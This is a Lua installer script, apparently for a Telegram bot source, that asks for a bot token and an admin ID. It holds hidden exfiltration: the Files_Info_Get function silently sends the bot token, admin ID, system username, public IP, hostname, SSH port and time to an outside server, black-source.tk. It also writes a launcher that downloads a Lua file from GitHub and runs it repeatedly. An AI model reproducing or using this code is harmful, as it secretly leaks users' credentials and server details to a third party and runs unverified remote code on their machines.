Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
database=dofile("./File/redis.lua").connect("127.0.0.1", 6379)
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
serpent=dofile("./File/serpent.lua")
JSON=dofile("./File/dkjson.lua")
json=dofile("./File/JSON.lua")
http= require("socket.http")
URL=dofile("./File/url.lua")
https= require("ssl.https")
local AutoFiles_Write = function() 
local Create_Info = function(Token,Sudo)  
local Write_Info_Sudo = io.open("sudo.lua", 'w')
Write_Info_Sudo:write([[

s = "BGBBB"

q = "FBBBBB"

token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

]])
Write_Info_Sudo:close()
end  
if not database:get(Server_Done.."Token_Write") then
print("\27[1;34mSend Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
sae = json:decode(url)
if res ~= 200 then
io.write('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
database:set(Server_Done.."Token_Write",token)
database:set(Server_Done.."username",sae.result.username)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
if not database:get(Server_Done.."UserSudo_Write") then
print("\27[1;34mSend Your Id Sudo :\27[m")
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
if res == 200 then
muaed = json:decode(data)
if muaed.Info.info == 'Is_Spam' then
io.write('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
os.execute('lua start.lua')
end ---ifBn
if muaed.Info.info == 'Ok' then
io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
database:set(Server_Done.."UserSudo_Write",Id)
end ---ifok
else
io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
local function Files_Info_Get()
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("Source", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/TEST
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr TEST.lua
wget "https://raw.githubusercontent.com/BOYKATEAM/TEST/main/TEST.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TEST.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("Run", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/TEST
while(true) do
rm -fr ../.telegram-cli
screen -S ]]..database:get(Server_Done.."username")..[[ -X kill
screen -S ]]..database:get(Server_Done.."username")..[[ ./TEST
done
]])
RunTs:close()
end
Files_Info_Get()
database:del(Server_Done.."username");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Write()  
var = true
else   
f:close()  
database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()